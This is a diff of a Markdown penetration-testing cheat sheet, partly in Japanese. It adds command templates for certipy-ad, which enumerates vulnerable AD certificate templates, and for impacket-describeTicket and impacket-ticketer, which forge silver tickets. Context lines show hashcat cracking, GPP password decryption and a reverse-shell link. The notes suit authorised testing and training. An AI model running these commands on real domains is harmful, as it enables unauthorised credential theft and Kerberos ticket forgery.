@@ -124,6 +124,11 @@ https://github.com/XiaoliChan/wmiexec-Pro
 
 
 ## 389
+- certipy-ad
+```sh
+ (TCP445番も必要)
+certipy-ad find -stdout -target 'IP' -enabled -vulnerable -u 'USERNAME' -p 'PASSWORD'
+```
 - godap ![GitHub Repo stars](https://img.shields.io/github/stars/Macmod/godap?style=social)
 ```sh
 ./godap 'IP' -u 'USERNAME' -p 'PASSWORD'
@@ -374,6 +379,11 @@ gpp-decrypt "Groups.xmlのcpassword"
 ```sh
 hashcat -a 0 -m 'NUM' 'INPUT.txt' /usr/share/wordlists/rockyou.txt --quiet
 ```
+- impacket-describeTicket
+```sh
+impacket-describeTicket 'CCACHE'
+impacket-describeTicket --rc4 'NTHASH' 'CCACHE'
+```
 - impacket-smbserver
 ```sh
 impacket-smbserver 'SHARENAME' 'PATH'
@@ -384,9 +394,10 @@ impacket-smbserver -smb2support 'SHARENAME' 'PATH'
 ```sh
 impacket-ticketConverter 'KIRBI' 'CCACHE'
 ```
-- impacket-describeTicket
+- impacket-ticketer
 ```sh
-impacket-describeTicket 'CCACHE'
+# silver ticket
+impacket-ticketer -spn 'SPN' -domain 'DOMAIN' -domain-sid 'SID' -nthash 'NTHASH' 'USERNAME'
 ```
 - ivan-sincek ![GitHub Repo stars](https://img.shields.io/github/stars/ivan-sincek/php-reverse-shell?style=social)
 - john ![GitHub Repo stars](https://img.shields.io/github/stars/openwall/john?style=social)
